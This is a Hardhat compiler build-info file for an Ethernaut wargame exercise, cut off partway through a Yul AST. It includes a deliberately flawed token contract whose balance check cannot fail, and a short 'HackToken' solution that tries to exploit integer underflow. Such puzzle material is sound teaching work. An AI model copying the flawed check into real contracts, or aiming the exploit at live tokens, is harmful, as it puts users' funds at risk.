{
	"id": "d930b86d2129055eae572a48d5053a14",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.1",
	"solcLongVersion": "0.8.1+commit.df193b15",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/ethernautTokenHack.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity >=0.8.0 <0.9.0;\r\nimport \"./ethernautToken.sol\";\r\n\r\ncontract HackToken{\r\n    Token public token;\r\n    constructor(address _token)public{\r\n        token = Token(_token);\r\n    }\r\n\r\n    function hackTransfer() public {\r\n        address _address = msg.sender;\r\n        uint256 _value = 20 + 1;\r\n\r\n        token.transfer(_address, _value);\r\n    }\r\n\r\n}"
			},
			"contracts/ethernautToken.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Token {\r\n\r\n  mapping(address => uint) balances;\r\n  uint public totalSupply;\r\n\r\n  constructor(uint _initialSupply) public {\r\n    balances[msg.sender] = totalSupply = _initialSupply;\r\n  }\r\n\r\n  function transfer(address _to, uint _value) public returns (bool) {\r\n    require(balances[msg.sender] - _value >= 0);\r\n    balances[msg.sender] -= _value;\r\n    balances[_to] += _value;\r\n    return true;\r\n  }\r\n\r\n  function balanceOf(address _owner) public view returns (uint balance) {\r\n    return balances[_owner];\r\n  }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/ethernautToken.sol": {
				"Token": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "_initialSupply",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "balance",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "_value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/ethernautToken.sol\":60:582  contract Token {\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/ethernautToken.sol\":150:254  constructor(uint _initialSupply) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/ethernautToken.sol\":234:248  _initialSupply */\n  dup1\n    /* \"contracts/ethernautToken.sol\":220:231  totalSupply */\n  0x01\n    /* \"contracts/ethernautToken.sol\":220:248  totalSupply = _initialSupply */\n  dup2\n  swap1\n  sstore\n    /* \"contracts/ethernautToken.sol\":197:205  balances */\n  0x00\n    /* \"contracts/ethernautToken.sol\":197:217  balances[msg.sender] */\n  dup1\n    /* \"contracts/ethernautToken.sol\":206:216  msg.sender */\n  caller\n    /* \"contracts/ethernautToken.sol\":197:217  balances[msg.sender] */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap1\n  dup2\n  mstore\n  0x20\n  add\n  0x00\n  keccak256\n    /* \"contracts/ethernautToken.sol\":197:248  balances[msg.sender] = totalSupply = _initialSupply */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contracts/ethernautToken.sol\":150:254  constructor(uint _initialSupply) public {\r... */\n  pop\n    /* \"contracts/ethernautToken.sol\":60:582  contract Token {\r... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":70:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:440   */\ntag_3:\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:245   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":291:292   */\n  0x00\n    /* \"#utility.yul\":288:289   */\n  dup1\n    /* \"#utility.yul\":281:293   */\n  revert\n    /* \"#utility.yul\":243:245   */\ntag_13:\n    /* \"#utility.yul\":334:335   */\n  0x00\n    /* \"#utility.yul\":359:423   */\n  tag_14\n    /* \"#utility.yul\":415:422   */\n  dup5\n    /* \"#utility.yul\":406:412   */\n  dup3\n    /* \"#utility.yul\":395:404   */\n  dup6\n    /* \"#utility.yul\":391:413   */\n  add\n    /* \"#utility.yul\":359:423   */\n  tag_8\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":349:423   */\n  swap2\n  pop\n    /* \"#utility.yul\":305:433   */\n  pop\n    /* \"#utility.yul\":233:440   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":446:523   */\ntag_15:\n  0x00\n    /* \"#utility.yul\":512:517   */\n  dup2\n    /* \"#utility.yul\":501:517   */\n  swap1\n  pop\n    /* \"#utility.yul\":491:523   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":529:651   */\ntag_11:\n    /* \"#utility.yul\":602:626   */\n  tag_18\n    /* \"#utility.yul\":620:625   */\n  dup2\n    /* \"#utility.yul\":602:626   */\n  tag_15\n  jump\t// in\ntag_18:\n    /* \"#utility.yul\":595:600   */\n  dup2\n    /* \"#utility.yul\":592:627   */\n  eq\n    /* \"#utility.yul\":582:584   */\n  tag_19\n  jumpi\n    /* \"#utility.yul\":641:642   */\n  0x00\n    /* \"#utility.yul\":638:639   */\n  dup1\n    /* \"#utility.yul\":631:643   */\n  revert\n    /* \"#utility.yul\":582:584   */\ntag_19:\n    /* \"#utility.yul\":572:651   */\n  pop\n  jump\t// out\n    /* \"contracts/ethernautToken.sol\":60:582  contract Token {\r... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/ethernautToken.sol\":60:582  contract Token {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x18160ddd\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/ethernautToken.sol\":120:143  uint public totalSupply */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      tag_8\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ethernautToken.sol\":473:579  function balanceOf(address _owner) public view returns (uint balance) {\r... */\n    tag_4:\n      tag_10\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      tag_13\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      tag_14\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ethernautToken.sol\":260:467  function transfer(address _to, uint _value) public returns (bool) {\r... */\n    tag_5:\n      tag_15\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      tag_18\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ethernautToken.sol\":120:143  uint public totalSupply */\n    tag_7:\n      sload(0x01)\n      dup2\n      jump\t// out\n        /* \"contracts/ethernautToken.sol\":473:579  function balanceOf(address _owner) public view returns (uint balance) {\r... */\n    tag_13:\n        /* \"contracts/ethernautToken.sol\":529:541  uint balance */\n      0x00\n        /* \"contracts/ethernautToken.sol\":557:565  balances */\n      dup1\n        /* \"contracts/ethernautToken.sol\":557:573  balances[_owner] */\n      0x00\n        /* \"contracts/ethernautToken.sol\":566:572  _owner */\n      dup4\n        /* \"contracts/ethernautToken.sol\":557:573  balances[_owner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/ethernautToken.sol\":550:573  return balances[_owner] */\n      swap1\n      pop\n        /* \"contracts/ethernautToken.sol\":473:579  function balanceOf(address _owner) public view returns (uint balance) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/ethernautToken.sol\":260:467  function transfer(address _to, uint _value) public returns (bool) {\r... */\n    tag_18:\n        /* \"contracts/ethernautToken.sol\":320:324  bool */\n      0x00\n        /* \"contracts/ethernautToken.sol\":374:375  0 */\n      dup1\n        /* \"contracts/ethernautToken.sol\":364:370  _value */\n      dup3\n        /* \"contracts/ethernautToken.sol\":341:349  balances */\n      0x00\n        /* \"contracts/ethernautToken.sol\":341:361  balances[msg.sender] */\n      dup1\n        /* \"contracts/ethernautToken.sol\":350:360  msg.sender */\n      caller\n        /* \"contracts/ethernautToken.sol\":341:361  balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/ethernautToken.sol\":341:370  balances[msg.sender] - _value */\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n        /* \"contracts/ethernautToken.sol\":341:375  balances[msg.sender] - _value >= 0 */\n      lt\n      iszero\n        /* \"contracts/ethernautToken.sol\":333:376  require(balances[msg.sender] - _value >= 0) */\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n        /* \"contracts/ethernautToken.sol\":407:413  _value */\n      dup2\n        /* \"contracts/ethernautToken.sol\":383:391  balances */\n      0x00\n        /* \"contracts/ethernautToken.sol\":383:403  balances[msg.sender] */\n      dup1\n        /* \"contracts/ethernautToken.sol\":392:402  msg.sender */\n      caller\n        /* \"contracts/ethernautToken.sol\":383:403  balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"contracts/ethernautToken.sol\":383:413  balances[msg.sender] -= _value */\n      dup3\n      dup3\n      sload\n      tag_26\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_26:\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/ethernautToken.sol\":437:443  _value */\n      dup2\n        /* \"contracts/ethernautToken.sol\":420:428  balances */\n      0x00\n        /* \"contracts/ethernautToken.sol\":420:433  balances[_to] */\n      dup1\n        /* \"contracts/ethernautToken.sol\":429:432  _to */\n      dup6\n        /* \"contracts/ethernautToken.sol\":420:433  balances[_to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"contracts/ethernautToken.sol\":420:443  balances[_to] += _value */\n      dup3\n      dup3\n      sload\n      tag_27\n      swap2\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/ethernautToken.sol\":457:461  true */\n      0x01\n        /* \"contracts/ethernautToken.sol\":450:461  return true */\n      swap1\n      pop\n        /* \"contracts/ethernautToken.sol\":260:467  function transfer(address _to, uint _value) public returns (bool) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:146   */\n    tag_30:\n      0x00\n        /* \"#utility.yul\":91:97   */\n      dup2\n        /* \"#utility.yul\":78:98   */\n      calldataload\n        /* \"#utility.yul\":69:98   */\n      swap1\n      pop\n        /* \"#utility.yul\":107:140   */\n      tag_32\n        /* \"#utility.yul\":134:139   */\n      dup2\n        /* \"#utility.yul\":107:140   */\n      tag_33\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":59:146   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":152:291   */\n    tag_34:\n      0x00\n        /* \"#utility.yul\":236:242   */\n      dup2\n        /* \"#utility.yul\":223:243   */\n      calldataload\n        /* \"#utility.yul\":214:243   */\n      swap1\n      pop\n        /* \"#utility.yul\":252:285   */\n      tag_36\n        /* \"#utility.yul\":279:284   */\n      dup2\n        /* \"#utility.yul\":252:285   */\n      tag_37\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":204:291   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":297:559   */\n    tag_12:\n      0x00\n        /* \"#utility.yul\":405:407   */\n      0x20\n        /* \"#utility.yul\":393:402   */\n      dup3\n        /* \"#utility.yul\":384:391   */\n      dup5\n        /* \"#utility.yul\":380:403   */\n      sub\n        /* \"#utility.yul\":376:408   */\n      slt\n        /* \"#utility.yul\":373:375   */\n      iszero\n      tag_39\n      jumpi\n        /* \"#utility.yul\":421:422   */\n      0x00\n        /* \"#utility.yul\":418:419   */\n      dup1\n        /* \"#utility.yul\":411:423   */\n      revert\n        /* \"#utility.yul\":373:375   */\n    tag_39:\n        /* \"#utility.yul\":464:465   */\n      0x00\n        /* \"#utility.yul\":489:542   */\n      tag_40\n        /* \"#utility.yul\":534:541   */\n      dup5\n        /* \"#utility.yul\":525:531   */\n      dup3\n        /* \"#utility.yul\":514:523   */\n      dup6\n        /* \"#utility.yul\":510:532   */\n      add\n        /* \"#utility.yul\":489:542   */\n      tag_30\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":479:542   */\n      swap2\n      pop\n        /* \"#utility.yul\":435:552   */\n      pop\n        /* \"#utility.yul\":363:559   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":565:972   */\n    tag_17:\n      0x00\n      dup1\n        /* \"#utility.yul\":690:692   */\n      0x40\n        /* \"#utility.yul\":678:687   */\n      dup4\n        /* \"#utility.yul\":669:676   */\n      dup6\n        /* \"#utility.yul\":665:688   */\n      sub\n        /* \"#utility.yul\":661:693   */\n      slt\n        /* \"#utility.yul\":658:660   */\n      iszero\n      tag_42\n      jumpi\n        /* \"#utility.yul\":706:707   */\n      0x00\n        /* \"#utility.yul\":703:704   */\n      dup1\n        /* \"#utility.yul\":696:708   */\n      revert\n        /* \"#utility.yul\":658:660   */\n    tag_42:\n        /* \"#utility.yul\":749:750   */\n      0x00\n        /* \"#utility.yul\":774:827   */\n      tag_43\n        /* \"#utility.yul\":819:826   */\n      dup6\n        /* \"#utility.yul\":810:816   */\n      dup3\n        /* \"#utility.yul\":799:808   */\n      dup7\n        /* \"#utility.yul\":795:817   */\n      add\n        /* \"#utility.yul\":774:827   */\n      tag_30\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":764:827   */\n      swap3\n      pop\n        /* \"#utility.yul\":720:837   */\n      pop\n        /* \"#utility.yul\":876:878   */\n      0x20\n        /* \"#utility.yul\":902:955   */\n      tag_44\n        /* \"#utility.yul\":947:954   */\n      dup6\n        /* \"#utility.yul\":938:944   */\n      dup3\n        /* \"#utility.yul\":927:936   */\n      dup7\n        /* \"#utility.yul\":923:945   */\n      add\n        /* \"#utility.yul\":902:955   */\n      tag_34\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":892:955   */\n      swap2\n      pop\n        /* \"#utility.yul\":847:965   */\n      pop\n        /* \"#utility.yul\":648:972   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":978:1087   */\n    tag_45:\n        /* \"#utility.yul\":1059:1080   */\n      tag_47\n        /* \"#utility.yul\":1074:1079   */\n      dup2\n        /* \"#utility.yul\":1059:1080   */\n      tag_48\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":1054:1057   */\n      dup3\n        /* \"#utility.yul\":1047:1081   */\n      mstore\n        /* \"#utility.yul\":1037:1087   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1093:1211   */\n    tag_49:\n        /* \"#utility.yul\":1180:1204   */\n      tag_51\n        /* \"#utility.yul\":1198:1203   */\n      dup2\n        /* \"#utility.yul\":1180:1204   */\n      tag_52\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1175:1178   */\n      dup3\n        /* \"#utility.yul\":1168:1205   */\n      mstore\n        /* \"#utility.yul\":1158:1211   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1217:1427   */\n    tag_20:\n      0x00\n        /* \"#utility.yul\":1342:1344   */\n      0x20\n        /* \"#utility.yul\":1331:1340   */\n      dup3\n        /* \"#utility.yul\":1327:1345   */\n      add\n        /* \"#utility.yul\":1319:1345   */\n      swap1\n      pop\n        /* \"#utility.yul\":1355:1420   */\n      tag_54\n        /* \"#utility.yul\":1417:1418   */\n      0x00\n        /* \"#utility.yul\":1406:1415   */\n      dup4\n        /* \"#utility.yul\":1402:1419   */\n      add\n        /* \"#utility.yul\":1393:1399   */\n      dup5\n        /* \"#utility.yul\":1355:1420   */\n      tag_45\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1309:1427   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1433:1655   */\n    tag_9:\n      0x00\n        /* \"#utility.yul\":1564:1566   */\n      0x20\n        /* \"#utility.yul\":1553:1562   */\n      dup3\n        /* \"#utility.yul\":1549:1567   */\n      add\n        /* \"#utility.yul\":1541:1567   */\n      swap1\n      pop\n        /* \"#utility.yul\":1577:1648   */\n      tag_56\n        /* \"#utility.yul\":1645:1646   */\n      0x00\n        /* \"#utility.yul\":1634:1643   */\n      dup4\n        /* \"#utility.yul\":1630:1647   */\n      add\n        /* \"#utility.yul\":1621:1627   */\n      dup5\n        /* \"#utility.yul\":1577:1648   */\n      tag_49\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1531:1655   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1661:1966   */\n    tag_28:\n      0x00\n        /* \"#utility.yul\":1720:1740   */\n      tag_58\n        /* \"#utility.yul\":1738:1739   */\n      dup3\n        /* \"#utility.yul\":1720:1740   */\n      tag_52\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1715:1740   */\n      swap2\n      pop\n        /* \"#utility.yul\":1754:1774   */\n      tag_59\n        /* \"#utility.yul\":1772:1773   */\n      dup4\n        /* \"#utility.yul\":1754:1774   */\n      tag_52\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1749:1774   */\n      swap3\n      pop\n        /* \"#utility.yul\":1908:1909   */\n      dup3\n        /* \"#utility.yul\":1840:1906   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1836:1910   */\n      sub\n        /* \"#utility.yul\":1833:1834   */\n      dup3\n        /* \"#utility.yul\":1830:1911   */\n      gt\n        /* \"#utility.yul\":1827:1829   */\n      iszero\n      tag_60\n      jumpi\n        /* \"#utility.yul\":1914:1932   */\n      tag_61\n      tag_62\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1827:1829   */\n    tag_60:\n        /* \"#utility.yul\":1958:1959   */\n      dup3\n        /* \"#utility.yul\":1955:1956   */\n      dup3\n        /* \"#utility.yul\":1951:1960   */\n      add\n        /* \"#utility.yul\":1944:1960   */\n      swap1\n      pop\n        /* \"#utility.yul\":1705:1966   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1972:2163   */\n    tag_24:\n      0x00\n        /* \"#utility.yul\":2032:2052   */\n      tag_64\n        /* \"#utility.yul\":2050:2051   */\n      dup3\n        /* \"#utility.yul\":2032:2052   */\n      tag_52\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":2027:2052   */\n      swap2\n      pop\n        /* \"#utility.yul\":2066:2086   */\n      tag_65\n        /* \"#utility.yul\":2084:2085   */\n      dup4\n        /* \"#utility.yul\":2066:2086   */\n      tag_52\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":2061:2086   */\n      swap3\n      pop\n        /* \"#utility.yul\":2105:2106   */\n      dup3\n        /* \"#utility.yul\":2102:2103   */\n      dup3\n        /* \"#utility.yul\":2099:2107   */\n      lt\n        /* \"#utility.yul\":2096:2098   */\n      iszero\n      tag_66\n      jumpi\n        /* \"#utility.yul\":2110:2128   */\n      tag_67\n      tag_62\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":2096:2098   */\n    tag_66:\n        /* \"#utility.yul\":2155:2156   */\n      dup3\n        /* \"#utility.yul\":2152:2153   */\n      dup3\n        /* \"#utility.yul\":2148:2157   */\n      sub\n        /* \"#utility.yul\":2140:2157   */\n      swap1\n      pop\n        /* \"#utility.yul\":2017:2163   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2169:2265   */\n    tag_68:\n      0x00\n        /* \"#utility.yul\":2235:2259   */\n      tag_70\n        /* \"#utility.yul\":2253:2258   */\n      dup3\n        /* \"#utility.yul\":2235:2259   */\n      tag_71\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2224:2259   */\n      swap1\n      pop\n        /* \"#utility.yul\":2214:2265   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2271:2361   */\n    tag_48:\n      0x00\n        /* \"#utility.yul\":2348:2353   */\n      dup2\n        /* \"#utility.yul\":2341:2354   */\n      iszero\n        /* \"#utility.yul\":2334:2355   */\n      iszero\n        /* \"#utility.yul\":2323:2355   */\n      swap1\n      pop\n        /* \"#utility.yul\":2313:2361   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2367:2493   */\n    tag_71:\n      0x00\n        /* \"#utility.yul\":2444:2486   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2437:2442   */\n      dup3\n        /* \"#utility.yul\":2433:2487   */\n      and\n        /* \"#utility.yul\":2422:2487   */\n      swap1\n      pop\n        /* \"#utility.yul\":2412:2493   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2499:2576   */\n    tag_52:\n      0x00\n        /* \"#utility.yul\":2565:2570   */\n      dup2\n        /* \"#utility.yul\":2554:2570   */\n      swap1\n      pop\n        /* \"#utility.yul\":2544:2576   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2582:2762   */\n    tag_62:\n        /* \"#utility.yul\":2630:2707   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2627:2628   */\n      0x00\n        /* \"#utility.yul\":2620:2708   */\n      mstore\n        /* \"#utility.yul\":2727:2731   */\n      0x11\n        /* \"#utility.yul\":2724:2725   */\n      0x04\n        /* \"#utility.yul\":2717:2732   */\n      mstore\n        /* \"#utility.yul\":2751:2755   */\n      0x24\n        /* \"#utility.yul\":2748:2749   */\n      0x00\n        /* \"#utility.yul\":2741:2756   */\n      revert\n        /* \"#utility.yul\":2768:2890   */\n    tag_33:\n        /* \"#utility.yul\":2841:2865   */\n      tag_77\n        /* \"#utility.yul\":2859:2864   */\n      dup2\n        /* \"#utility.yul\":2841:2865   */\n      tag_68\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":2834:2839   */\n      dup2\n        /* \"#utility.yul\":2831:2866   */\n      eq\n        /* \"#utility.yul\":2821:2823   */\n      tag_78\n      jumpi\n        /* \"#utility.yul\":2880:2881   */\n      0x00\n        /* \"#utility.yul\":2877:2878   */\n      dup1\n        /* \"#utility.yul\":2870:2882   */\n      revert\n        /* \"#utility.yul\":2821:2823   */\n    tag_78:\n        /* \"#utility.yul\":2811:2890   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2896:3018   */\n    tag_37:\n        /* \"#utility.yul\":2969:2993   */\n      tag_80\n        /* \"#utility.yul\":2987:2992   */\n      dup2\n        /* \"#utility.yul\":2969:2993   */\n      tag_52\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2962:2967   */\n      dup2\n        /* \"#utility.yul\":2959:2994   */\n      eq\n        /* \"#utility.yul\":2949:2951   */\n      tag_81\n      jumpi\n        /* \"#utility.yul\":3008:3009   */\n      0x00\n        /* \"#utility.yul\":3005:3006   */\n      dup1\n        /* \"#utility.yul\":2998:3010   */\n      revert\n        /* \"#utility.yul\":2949:2951   */\n    tag_81:\n        /* \"#utility.yul\":2939:3018   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212202c7a7a3b801135e796914b927415438ed61c53fb783151f063675b537975d11564736f6c63430008010033\n}\n",
						"bytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:654:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "70:80:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "80:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "95:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "89:5:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "89:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "80:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "138:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "111:26:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "111:33:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "111:33:2"
														}
													]
												},
												"name": "abi_decode_t_uint256_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "48:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "56:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "64:5:2",
														"type": ""
													}
												],
												"src": "7:143:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "233:207:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "279:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "288:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "291:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "281:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "281:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "281:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "254:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "263:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
